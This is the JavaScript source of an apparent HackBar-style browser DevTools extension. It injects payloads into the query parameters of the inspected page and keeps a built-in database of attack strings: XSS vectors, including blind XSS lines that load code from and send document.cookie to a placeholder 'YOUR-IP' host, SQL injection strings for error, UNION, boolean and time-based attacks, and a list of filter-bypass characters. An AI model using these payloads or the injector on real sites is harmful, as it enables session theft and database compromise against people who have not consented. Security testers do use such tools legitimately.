document.addEventListener("DOMContentLoaded", () => {

  const payload = document.getElementById("payload");
  const codec = document.getElementById("codec");
  const injectBtn = document.getElementById("injectBtn");
  const encBtn = document.getElementById("encBtn");
  const decBtn = document.getElementById("decBtn");
  const bypassBox = document.getElementById("bypass");

  /* ---------- AUTO EXPAND TEXTAREA ---------- */
  function autoGrow(el) {
    el.style.height = "auto";
    el.style.height = el.scrollHeight + "px";
  }

  [payload, codec].forEach(t =>
    t.addEventListener("input", () => autoGrow(t))
  );

  /* ---------- SMART INJECT (HACKBAR STYLE) ---------- */
  injectBtn.addEventListener("click", () => {
    const p = payload.value.trim();
    if (!p) return;

    chrome.devtools.inspectedWindow.eval(`
    (function () {
      const payload = ${JSON.stringify(p)};
      let url = location.href;

      console.log("[Injector] Payload:", payload);

      // RAW MODE (? or &)
      if (payload.startsWith("?") || payload.startsWith("&")) {
        const q = payload.replace(/^\\?/, "");
        if (url.includes("?")) {
          location.href = url + "&" + q;
        } else {
          location.href = url + "?" + q;
        }
        console.log("[Injector] Injected as raw query");
        return;
      }

      // PARAMETER MODE
      let u = new URL(url);
      let keys = [...u.searchParams.keys()];

      if (keys.length) {
        u.searchParams.set(keys[0], payload);
        console.log("[Injector] Replaced param:", keys[0]);
        location.href = u.toString();
      } else {
        console.warn("[Injector] No parameters found. Use ?param=value");
      }
    })();
    `);
  });

  /* ---------- URL ENCODE ---------- */
  encBtn.addEventListener("click", () => {
    codec.value = encodeURIComponent(codec.value);
    autoGrow(codec);
  });

  /* ---------- URL DECODE ---------- */
  decBtn.addEventListener("click", () => {
    try {
      codec.value = decodeURIComponent(codec.value);
    } catch {
      codec.value = "Invalid URL encoding";
    }
    autoGrow(codec);
  });

  /* ---------- BYPASS CHARACTERS ---------- */
  const bypassChars = [
    "'", "\"", "`", "\\", "/",
    "%2f", "%252f",
    "<", ">", "%3c", "%3e",
    ";", "%00", "%0a", "%0d",
    "|", "&", "&&", "||",
    "()", "${}",
    "%09", "%20",
    '/">',
    
  ];

  bypassChars.forEach(c => {
    const s = document.createElement("span");
    s.className = "badge";
    s.textContent = c;

    s.addEventListener("click", () => {
      const tmp = document.createElement("textarea");
      tmp.value = c;
      document.body.appendChild(tmp);
      tmp.select();
      document.execCommand("copy");
      document.body.removeChild(tmp);
    });

    bypassBox.appendChild(s);
  });

  /* ======================================================
     =============== PAYLOAD SYSTEM (ADDED) ===============
     ====================================================== */

  const modeBox = document.getElementById("modeBox");
  const typeBox = document.getElementById("typeBox");
  const payloadBox = document.getElementById("payloadBox");

  const PAYLOAD_DB = {
    xss: {
      basic: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>"
      ],
      blind: [
        "<script src=http://YOUR-IP/x.js></script>",
        "<img src=http://YOUR-IP/x onerror=1>",
        "<svg/onload=fetch('http://YOUR-IP/'+document.cookie)>"
      ],
      dom: [
        "\";alert(1);//",
        "#<svg/onload=alert(1)>",
        "?<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
      ]
    },

    sqli: {
      basic: [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'--",
        "'#"
      ],
      error: [
        "'",
        "\"",
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "' AND updatexml(1,concat(0x7e,version()),1)-- -"
      ],
      union: [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT @@version,NULL-- -"
      ],
      boolean: [
        "' AND 1=1-- -",
        "' AND 1=2-- -"
      ],
      time: [
        "' AND sleep(5)-- -",
        "' OR sleep(5)-- -"
      ]
    }
  };

  function copyText(text) {
    const t = document.createElement("textarea");
    t.value = text;
    document.body.appendChild(t);
    t.select();
    document.execCommand("copy");
    document.body.removeChild(t);
  }

  function renderTypes(mode) {
    typeBox.innerHTML = "";
    payloadBox.innerHTML = "";

    Object.keys(PAYLOAD_DB[mode]).forEach(type => {
      const b = document.createElement("span");
      b.className = "badge";
      b.textContent = type;
      b.onclick = () => renderPayloads(mode, type);
      typeBox.appendChild(b);
    });
  }

  function renderPayloads(mode, type) {
    payloadBox.innerHTML = "";

    PAYLOAD_DB[mode][type].forEach(p => {
      const d = document.createElement("div");
      d.className = "badge payload";
      d.textContent = p;

      d.onclick = () => {
        payload.value = p;
        autoGrow(payload);
        copyText(p);
      };

      payloadBox.appendChild(d);
    });
  }

  modeBox.querySelectorAll(".badge").forEach(b => {
    b.addEventListener("click", () => {
      renderTypes(b.dataset.mode);
    });
  });

  modeBox.querySelectorAll(".badge").forEach(b => {
  b.addEventListener("click", () => {
    modeBox.querySelectorAll(".badge").forEach(x => {
      x.style.background = "#111";
    });
    b.style.background = "#222";
    renderTypes(b.dataset.mode);
  });
});


});
